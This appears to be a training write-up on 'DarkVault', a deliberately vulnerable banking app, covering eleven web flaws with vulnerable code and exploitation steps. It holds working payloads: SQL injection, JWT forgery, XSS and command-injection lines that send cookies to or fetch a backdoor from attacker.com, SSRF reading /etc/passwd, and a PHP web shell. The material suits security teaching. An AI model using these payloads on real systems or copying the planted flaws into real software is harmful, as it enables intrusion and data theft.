# DarkVault: Web Application Vulnerabilities Deep Dive
## A Technical Analysis of Common Web Security Flaws

---

## Introduction

- DarkVault is a deliberately vulnerable banking application
- Designed to demonstrate real-world web vulnerabilities
- Each vulnerability has been carefully implemented to showcase exploitation techniques
- Ideal for security training, educational purposes, and CTF-style challenges

---

## Vulnerability #1: SQL Injection

### Vulnerable Code: Cookie-Based SQL Injection

```javascript
// Cookie-based SQL injection
app.get('/api/user-preferences', verifyToken, (req, res) => {
  // Get theme from cookie - VULNERABLE TO SQL INJECTION BY DESIGN
  const theme = req.cookies?.theme || 'default';
  
  console.log(`Loading preferences with theme: ${theme}`);
  
  // VULNERABLE BY DESIGN: Direct use of cookie value in SQL query
  // This can be exploited with a cookie like: theme=dark' UNION SELECT password,username,email FROM users--
  const query = `SELECT * FROM themes WHERE name = '${theme}'`;
  
  db.all(query, (err, themes) => {
    // Response handling code...
  });
});
```

### Technical Details

- **Root Cause**: User-controlled cookie value directly concatenated into SQL query without sanitization
- **Vulnerability Pattern**: Classic string concatenation vulnerability
- **Impact**: Allows attackers to modify the SQL query structure

### Exploitation

1. **Set the cookie with a payload**:
   ```
   theme=dark' UNION SELECT password,username,email FROM users--
   ```

2. **How it works**:
   - Original query: `SELECT * FROM themes WHERE name = 'dark'`
   - Modified query: `SELECT * FROM themes WHERE name = 'dark' UNION SELECT password,username,email FROM users--'`
   - The `UNION` operator combines results from both queries
   - The comment marker `--` causes the rest of the query to be ignored

3. **Result**: The query returns user credentials instead of themes

---

## Vulnerability #2: JWT Token Manipulation

### Vulnerable Code: JWT Verification

```javascript
// Middleware for token verification - Keep the JWT vulnerability by design
const verifyToken = (req, res, next) => {
  const token = req.headers['authorization'];
  
  if (!token) {
    return res.status(401).json({ 
      message: 'No token provided',
      hint: 'Authentication required' 
    });
  } else {
    try {
      // VULNERABLE BY DESIGN: JWT verification still accepts multiple secrets
      // and doesn't properly validate role claims against the database
      let decoded;
      try {
        decoded = jwt.verify(token, JWT_SECRET);
      } catch (mainErr) {
        // If main secret fails, try the weak testing key
        try {
          decoded = jwt.verify(token, WEAK_KEY);
          console.log('WARNING: JWT verified with weak dev key!');
        } catch (devErr) {
          throw mainErr;
        }
      }
      
      // Successfully verified the token
      req.user = decoded;
      
      // Load the user's real data from the database to compare with token claims
      db.get(`SELECT * FROM users WHERE id = ?`, [decoded.id], (err, user) => {
        // VULNERABLE BY DESIGN: Does not validate token role against database role
        // This allows privilege escalation by manipulating the JWT payload
        req.user.username = user.username;
        req.user.email = user.email;
        // req.user.role is not overwritten from DB, allowing token role to be used
        req.user.balance = user.balance;
        
        // Add user's discovered secrets if any
        loadExploitChainProgress(req, res, next);
      });
    } catch (error) {
      // Error handling...
    }
  }
};
```

### Technical Details

- **Root Cause 1**: Support for multiple secrets, including a weak testing key
- **Root Cause 2**: Failure to validate token claims (role) against database values
- **Vulnerability Pattern**: Improper JWT validation and overreliance on client-provided data

### Exploitation

1. **Extract and decode JWT token**
   ```javascript
   // Decode without verification to analyze structure
   const decodedToken = jwt.decode(token);
   ```

2. **Modify the payload to elevate privileges**
   ```javascript
   // Original payload
   { "id": 2, "username": "alice", "role": "user" }
   
   // Modified payload
   { "id": 2, "username": "alice", "role": "admin" }
   ```

3. **Sign with weak testing key**
   ```javascript
   // Sign with the weak key exposed in code or error messages
   const forgedToken = jwt.sign(modifiedPayload, 'dev-key', { algorithm: 'HS256' });
   ```

4. **Result**: The attacker can gain administrative privileges

---

## Vulnerability #3: DOM-based XSS

### Vulnerable Code: Unsafe innerHTML Usage

```javascript
// DOM-based XSS vulnerability - PRESERVED BY DESIGN
app.get('/api/documentation', verifyToken, (req, res) => {
  // Send HTML with JavaScript that uses fragment identifier (hash)
  // This is vulnerable to DOM-based XSS via the URL fragment
  // Example: /api/documentation#<img src=x onerror=alert(document.cookie)>
  const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>API Documentation</title>
      <script>
        // VULNERABLE BY DESIGN: Directly using location.hash without sanitization
        window.onload = function() {
          // Get the hash value from the URL (without the # symbol)
          var section = window.location.hash.substring(1);
          
          // Use it to navigate to a section - DOM-based XSS vulnerability
          if(section) {
            // This is vulnerable - directly writing the hash to innerHTML
            document.getElementById('section-title').innerHTML = 'Section: ' + section;
            document.getElementById('content').innerHTML = 'Loading content for ' + section + '...';
          }
        };
      </script>
    </head>
    <body>
      <h1>API Documentation</h1>
      <h2 id="section-title">Welcome</h2>
      <div id="content">
        <p>Select a section from the URL hash to view documentation.</p>
        <p>Example: <code>#authentication</code>, <code>#endpoints</code>, etc.</p>
      </div>
    </body>
    </html>
  `;
  
  res.setHeader('Content-Type', 'text/html');
  return res.status(200).send(htmlContent);
});
```

### Technical Details

- **Root Cause**: User-controlled URL fragment (#hash) directly inserted into innerHTML
- **Vulnerability Pattern**: Unsafe DOM manipulation without sanitization
- **Impact**: Allows execution of arbitrary JavaScript in the context of the page

### Exploitation

1. **Craft a malicious URL with an XSS payload in the fragment**:
   ```
   https://example.com/api/documentation#<img src=x onerror=alert(document.cookie)>
   ```

2. **How it works**:
   - The URL fragment is not sent to the server, so server-side protections don't apply
   - When the page loads, JavaScript reads `window.location.hash`
   - The payload is directly inserted into the DOM via `innerHTML`
   - The browser parses the injected HTML and executes the JavaScript

3. **Advanced exploitation**: Data exfiltration
   ```html
   #<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
   ```

---

## Vulnerability #4: Prototype Pollution

### Vulnerable Code: Unsafe Object Merging

```javascript
// Prototype pollution vulnerability - PRESERVED BY DESIGN
app.post('/api/merge-settings', verifyToken, (req, res) => {
  const userSettings = req.body;
  
  // Get current user settings from database
  db.get('SELECT settings FROM user_settings WHERE user_id = ?', [req.user.id], (err, row) => {
    let currentSettings = {};
    
    if (row && row.settings) {
      try {
        currentSettings = JSON.parse(row.settings);
      } catch (e) {
        console.error('Error parsing settings:', e);
      }
    }
    
    // VULNERABLE BY DESIGN: Unsafe recursive merge that allows prototype pollution
    function unsafeMerge(target, source) {
      for (const key in source) {
        if (source[key] && typeof source[key] === 'object') {
          if (!target[key]) target[key] = {};
          unsafeMerge(target[key], source[key]);
        } else {
          target[key] = source[key];
        }
      }
      return target;
    }
    
    // Perform the unsafe merge
    const mergedSettings = unsafeMerge(currentSettings, userSettings);
    
    // Save merged settings back to database
    // ...
  });
});

// API for checking if user is admin - vulnerable to prototype pollution
app.get('/api/check-admin', verifyToken, (req, res) => {
  // VULNERABLE BY DESIGN: This endpoint is affected by prototype pollution
  // If Object.prototype.isAdmin has been polluted, this will return true
  const isAdmin = req.user.role === 'admin' || {};  // The empty object can be polluted
  
  return res.status(200).json({
    admin: isAdmin,
    message: isAdmin ? 'User is admin' : 'User is not admin'
  });
});
```

### Technical Details

- **Root Cause**: Recursive merging function doesn't check for special property names
- **Vulnerability Pattern**: No validation of property names during object merging
- **Impact**: Allows modification of Object.prototype, affecting all objects in the application

### Exploitation

1. **Send a specially crafted JSON payload**:
   ```json
   {
     "__proto__": {
       "isAdmin": true
     }
   }
   ```

2. **How it works**:
   - The `unsafeMerge` function recursively processes all keys in the source object
   - When it encounters `__proto__`, it tries to merge it with the target's `__proto__`
   - This modifies the prototype of all JavaScript objects
   - Later, `{}` inherits the polluted `isAdmin: true` property
   - Condition `req.user.role === 'admin' || {}` evaluates to true

3. **Result**: An attacker can gain admin privileges through prototype pollution

---

## Vulnerability #5: CSRF (Cross-Site Request Forgery)

### Vulnerable Code: Missing CSRF Protection

```javascript
// CSRF vulnerability for email updates - PRESERVED BY DESIGN
app.post('/api/update-email', verifyToken, (req, res) => {
  const { email } = req.body;
  const userId = req.user.id;
  
  // VULNERABLE BY DESIGN: No CSRF token validation
  // This can be exploited with a form on an attacker's site
  db.run(
    'UPDATE users SET email = ? WHERE id = ?',
    [email, userId],
    function(err) {
      if (err) {
        return res.status(500).json({ error: 'Failed to update email' });
      }
      
      return res.status(200).json({
        success: true,
        message: 'Email updated successfully'
      });
    }
  );
});
```

### Technical Details

- **Root Cause**: No CSRF token or other state-changing request validation
- **Vulnerability Pattern**: Reliance solely on session cookies for authentication
- **Impact**: Allows attackers to perform actions on behalf of authenticated users

### Exploitation

1. **Create a malicious page with an auto-submitting form**:
   ```html
   <html>
     <body onload="document.forms[0].submit()">
       <form action="https://darkvault.example.com/api/update-email" method="POST">
         <input type="hidden" name="email" value="attacker@evil.com">
       </form>
     </body>
   </html>
   ```

2. **How it works**:
   - The victim visits the attacker's site while logged into DarkVault
   - The form automatically submits to DarkVault's API
   - The browser includes the victim's authentication cookies
   - DarkVault processes the request as if it came from the legitimate user
   - The email is changed to the attacker's address

3. **Impact**: The attacker can take over the account by requesting password resets

---

## Vulnerability #6: Second-Order SQL Injection

### Vulnerable Code: Profile Updates with SQL Injection

```javascript
// Blind second-order SQL injection vulnerability - PRESERVED BY DESIGN
app.post('/api/users/update-profile', verifyToken, (req, res) => {
  const { bio, website, location } = req.body;
  
  // First part uses parameterized query and appears secure
  try {
    db.run(
      `UPDATE users SET bio = ?, website = ?, location = ? WHERE id = ?`,
      [bio, website, location, req.user.id],
      function(err) {
        if (err) {
          console.error('Error updating profile:', err.message);
          return res.status(500).json({ error: 'Failed to update profile' });
        }
        
        // Create a profile_updates table if it doesn't exist
        db.run(`CREATE TABLE IF NOT EXISTS profile_updates (
          id INTEGER PRIMARY KEY,
          user_id INTEGER,
          field TEXT,
          old_value TEXT,
          new_value TEXT,
          date TEXT
        )`, function(err) {
          if (err) {
            console.error('Error creating profile_updates table:', err.message);
          }
          
          // VULNERABLE BY DESIGN: Second-order SQL injection happens here
          if (location) {
            // Directly concatenating user input into SQL query
            const dateStr = new Date().toISOString();
            const updateQuery = `INSERT INTO profile_updates (user_id, field, new_value, date) 
              VALUES (${req.user.id}, 'location', '${location}', '${dateStr}')`;
            
            // Execute the vulnerable query
            db.run(updateQuery, function(err) {
              if (err) {
                // The error is hidden from the user, making this a blind injection
                console.error('Error logging profile update:', err.message);
              }
            });
          }
        });
        
        return res.status(200).json({ 
          success: true, 
          message: 'Profile updated successfully'
        });
      }
    );
  } catch (error) {
    console.error('Profile update error:', error.message);
    return res.status(500).json({ error: 'Failed to update profile' });
  }
});

// Admin endpoint to view profile updates - executes second-order SQL injection
app.get('/api/admin/profile-updates', verifyToken, (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ message: 'Unauthorized' });
  }
  
  // This query executes any SQL injection payloads in the profile_updates table
  // with admin privileges, completing the second-order injection
  db.all(`SELECT * FROM profile_updates ORDER BY date DESC`, (err, updates) => {
    if (err) {
      console.error('Error fetching profile updates:', err.message);
      return res.status(500).json({ error: 'Failed to fetch profile updates' });
    }
    
    return res.status(200).json(updates);
  });
});
```

### Technical Details

- **Root Cause**: User input is stored safely but later used in an unsafe SQL context
- **Vulnerability Pattern**: Direct string concatenation in a secondary operation
- **Impact**: Allows attackers to inject SQL that will be executed when viewed by an admin

### Exploitation

1. **Store a malicious payload in the location field**:
   ```
   New York', (SELECT sqlite_version())), ('2', 'pwned', (SELECT password FROM users WHERE role='admin'
   ```

2. **How it works**:
   - First query (user update) is parameterized and safe
   - The payload is stored in the database verbatim
   - Secondary query constructs SQL dynamically with the stored payload
   - When an admin views profile updates, the injected SQL executes with admin privileges

3. **Result**: The attacker can extract sensitive data or manipulate the database with elevated privileges

---

## Vulnerability #7: Race Condition

### Vulnerable Code: Transfer Function

```javascript
// Race condition vulnerability - PRESERVED BY DESIGN
app.post('/api/quick-transfer', verifyToken, async (req, res) => {
  const { to, amount } = req.body;
  const from = req.user.id;
  
  // Parse amount as float
  const parsedAmount = parseFloat(amount);
  
  // VULNERABLE BY DESIGN: No transaction lock - vulnerable to race conditions
  try {
    // Get sender's current balance
    db.get('SELECT balance FROM users WHERE id = ?', [from], (err, sender) => {
      if (err) {
        return res.status(500).json({ error: 'Database error' });
      }
      
      if (!sender) {
        return res.status(404).json({ error: 'Sender not found' });
      }
      
      if (sender.balance < parsedAmount) {
        return res.status(400).json({ error: 'Insufficient funds' });
      }
      
      // Add an artificial delay to make race condition easier to exploit
      setTimeout(() => {
        // Update sender balance
        db.run(
          'UPDATE users SET balance = balance - ? WHERE id = ?',
          [parsedAmount, from],
          function(err) {
            // Update receiver balance, create transaction record...
          }
        );
      }, 500); // 500ms delay to make race condition exploitable
    });
  } catch (error) {
    return res.status(500).json({ error: 'Transfer failed' });
  }
});
```

### Technical Details

- **Root Cause**: Lack of proper transaction isolation with a time-of-check to time-of-use (TOCTOU) gap
- **Vulnerability Pattern**: Balance check and update are not atomic operations
- **Impact**: Allows users to transfer more money than they actually have

### Exploitation

1. **Create multiple concurrent transfer requests**:
   ```javascript
   // Assuming the user has $1000 balance
   // Send 5 simultaneous requests for $800 each
   for (let i = 0; i < 5; i++) {
     fetch('/api/quick-transfer', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         'Authorization': token
       },
       body: JSON.stringify({
         to: recipientId,
         amount: 800
       })
     });
   }
   ```

2. **How it works**:
   - Each request independently checks if balance ≥ amount
   - All requests see the initial balance of $1000
   - All requests pass the balance check
   - Each request then deducts $800, resulting in multiple deductions
   - The user transfers $4000 with only $1000 balance

3. **Result**: The attacker can drain funds beyond their actual balance

---

## Vulnerability #8: IDOR (Insecure Direct Object Reference)

### Vulnerable Code: Access Control Bypass

```javascript
// This is the fixed version, but the app may contain the vulnerable version elsewhere
app.get('/api/users/:id', verifyToken, (req, res) => {
  const id = req.params.id;
  
  // Only allow users to access their own profile or admins to access any profile
  if (req.user.id.toString() !== id && req.user.role !== 'admin') {
    return res.status(403).json({ message: 'Unauthorized - You can only access your own profile' });
  }
  
  // Use parameterized query instead of string concatenation
  db.get(`SELECT * FROM users WHERE id = ?`, [id], (err, user) => {
    if (err) {
      return res.status(500).json({ error: 'Database error' });
    }
    
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }
    
    return res.status(200).json(user);
  });
});

// Other endpoints may have IDOR vulnerabilities where they don't check ownership
// For example, an endpoint that accepts a profile ID parameter without verifying
// that the current user owns that profile
```

### Technical Details

- **Root Cause**: Insufficient access control validation on resource identifiers
- **Vulnerability Pattern**: Relying on client-supplied IDs without proper authorization checks
- **Impact**: Allows attackers to access or modify resources belonging to other users

### Exploitation

1. **Modify resource identifiers in requests**:
   ```
   # Original request (user's own profile)
   GET /api/users/2
   
   # Modified request (another user's profile)
   GET /api/users/1
   ```

2. **How it works**:
   - Attacker identifies endpoints that accept resource IDs
   - They change the ID to target another user's resources
   - If the application doesn't verify ownership, access is granted
   - The attacker can view or manipulate unauthorized resources

3. **Result**: The attacker can access other users' private data or perform unauthorized actions

---

## Vulnerability #9: SSRF (Server-Side Request Forgery)

### Vulnerable Code: Proxy Endpoint

```javascript
// SSRF vulnerability - ENHANCED BY DESIGN
app.get('/api/proxy', verifyToken, (req, res) => {
  const { url } = req.query;
  
  if (!url) {
    return res.status(400).json({ 
      error: 'URL parameter is required',
      example: '/api/proxy?url=https://api.github.com/users'
    });
  }
  
  console.log(`Proxy request to: ${url}`);
  
  // VULNERABLE BY DESIGN: Support for file:// protocol
  if (url.startsWith('file://')) {
    try {
      // Extract the file path from the URL
      const filePath = url.substring(7);
      
      // Read the file
      const fileContent = fs.readFileSync(filePath, 'utf8');
      
      // Send the file content as response
      return res.status(200).send(fileContent);
    } catch (error) {
      return res.status(500).json({ 
        error: 'File read error', 
        message: error.message
      });
    }
  }
  
  // VULNERABLE BY DESIGN: No validation of URL - allows access to internal resources
  fetch(url)
    .then(response => response.text())
    .then(data => {
      res.setHeader('Content-Type', 'text/plain');
      return res.status(200).send(data);
    })
    .catch(error => {
      return res.status(500).json({ error: 'Failed to fetch URL' });
    });
});
```

### Technical Details

- **Root Cause**: Unvalidated URL parameter used to make server-side requests
- **Vulnerability Pattern**: Lack of URL validation or restriction
- **Impact**: Allows attackers to make the server perform requests to internal resources

### Exploitation

1. **Access internal services not exposed externally**:
   ```
   /api/proxy?url=http://localhost:3001/admin-dashboard
   ```

2. **Access local files on the server**:
   ```
   /api/proxy?url=file:///etc/passwd
   ```

3. **How it works**:
   - The application makes requests to any URL provided by the user
   - This can target internal network services normally inaccessible from outside
   - It can also access local files using the file:// protocol
   - The server acts as a proxy, retrieving content on behalf of the attacker

4. **Result**: The attacker can access internal services, read local files, and potentially exploit internal vulnerabilities

---

## Vulnerability #10: Command Injection

### Vulnerable Code: Report Generation

```javascript
// Example of a command injection vulnerability (since fixed in the current code)
app.post('/api/admin/report', verifyToken, (req, res) => {
  // Only allow admin users
  if (req.user.role !== 'admin') {
    return res.status(403).json({
      error: 'Unauthorized',
      message: 'Only admins can run reports'
    });
  }

  // Get report parameters from request body
  const { report_name } = req.body;
  
  if (!report_name) {
    return res.status(400).json({
      error: 'Missing parameters',
      message: 'Report name is required'
    });
  }

  // VULNERABLE: Unsanitized input goes directly to command
  const cmd = `generate_report ${report_name} > /tmp/report.txt`;
  
  exec(cmd, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({
        error: 'Report generation failed',
        message: stderr
      });
    }
    
    // Read and return the report
    fs.readFile('/tmp/report.txt', 'utf8', (err, data) => {
      if (err) {
        return res.status(500).json({ error: 'Could not read report' });
      }
      
      return res.json({
        success: true,
        report: data
      });
    });
  });
});
```

### Technical Details

- **Root Cause**: User input directly injected into a command string
- **Vulnerability Pattern**: Concatenating user input into shell commands
- **Impact**: Allows attackers to execute arbitrary system commands

### Exploitation

1. **Inject shell commands using operators**:
   ```
   quarterly_sales; cat /etc/passwd
   ```

2. **More advanced payloads**:
   ```
   quarterly_sales && wget -O /tmp/backdoor.sh http://attacker.com/backdoor.sh && bash /tmp/backdoor.sh
   ```

3. **How it works**:
   - Shell command separators like `;`, `&&`, `||` allow chaining multiple commands
   - The injected commands execute with the same privileges as the web application
   - This allows arbitrary code execution on the server

4. **Result**: The attacker gains the ability to execute arbitrary commands on the server

---

## Vulnerability #11: Insecure File Upload

### Vulnerable Code: File Upload Handling

```javascript
// This is the more secure version, but the app may have insecure uploads elsewhere
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    // Safe upload path
    const uploadDir = 'uploads';
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    // Sanitize filename to prevent path traversal
    const sanitizedName = path.basename(file.originalname).replace(/[^a-zA-Z0-9_.-]/g, '_');
    cb(null, Date.now() + '-' + sanitizedName);
  }
});

// Secure file filter
const fileFilter = function(req, file, cb) {
  // Check mime type and extension
  const allowedMimeTypes = ['image/jpeg', 'image/png', 'application/pdf', 'text/plain'];
  const allowedExtensions = ['.jpg', '.jpeg', '.png', '.pdf', '.txt'];
  
  const ext = path.extname(file.originalname).toLowerCase();
  
  if (allowedMimeTypes.includes(file.mimetype) && allowedExtensions.includes(ext)) {
    cb(null, true);
  } else {
    cb(null, false);
  }
};

// Vulnerable version might directly use user-provided paths or not validate file content
app.post('/api/upload-special', verifyToken, (req, res) => {
  // VULNERABLE: Uses user-supplied path
  const uploadPath = req.headers['x-upload-path'] || 'uploads';
  
  // Create custom storage for this request
  const customStorage = multer.diskStorage({
    destination: function (req, file, cb) {
      if (!fs.existsSync(uploadPath)) {
        fs.mkdirSync(uploadPath, { recursive: true });
      }
      cb(null, uploadPath);
    },
    filename: function (req, file, cb) {
      // VULNERABLE: Uses original filename
      cb(null, file.originalname);
    }
  });
  
  const upload = multer({ storage: customStorage }).single('file');
  
  upload(req, res, function(err) {
    // Handle upload...
  });
});
```

### Technical Details

- **Root Cause**: Insufficient validation of file uploads
- **Vulnerability Pattern**: Inadequate checks on file type, content, or storage location
- **Impact**: Allows uploading and executing malicious files

### Exploitation

1. **Upload a malicious file with a deceptive extension**:
   ```
   # Malicious PHP file disguised as an image
   evil.php.jpg
   ```

2. **Path traversal in upload location**:
   ```
   # Using path traversal to write to a sensitive location
   X-Upload-Path: ../public/images
   ```

3. **Upload a web shell**:
   ```php
   <?php
   if(isset($_REQUEST['cmd'])){
     echo "<pre>";
     $cmd = ($_REQUEST['cmd']);
     system($cmd);
     echo "</pre>";
   }
   ?>
   ```

4. **How it works**:
   - Lack of proper validation allows uploading executable files
   - Path traversal allows writing to unintended locations
   - Files may be directly accessible via the web server
   - Uploaded web shells provide command execution capabilities

5. **Result**: The attacker can upload malicious files that provide backdoor access to the server

---

## Conclusion

### Key Takeaways

- Web vulnerabilities often stem from trust in user input
- Input validation should happen at all layers
- Security is about defense in depth
- Modern frameworks provide built-in protections, but developers need to understand the risks

### Prevention Strategies

- **SQL Injection**: Use parameterized queries/prepared statements
- **XSS**: Content Security Policy (CSP) and output encoding
- **CSRF**: Anti-CSRF tokens, SameSite cookies
- **JWT Issues**: Proper validation, secure key management
- **Prototype Pollution**: Deep cloning, Object.freeze()
- **SSRF**: Allowlist validation, egress filtering
- **Command Injection**: Input validation, avoid shell execution
- **File Uploads**: Strict validation, separate domains for user content
- **IDOR**: Access control checks, indirect object references
- **Race Conditions**: Proper transaction isolation

### Additional Resources

- [OWASP Top Ten](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security) 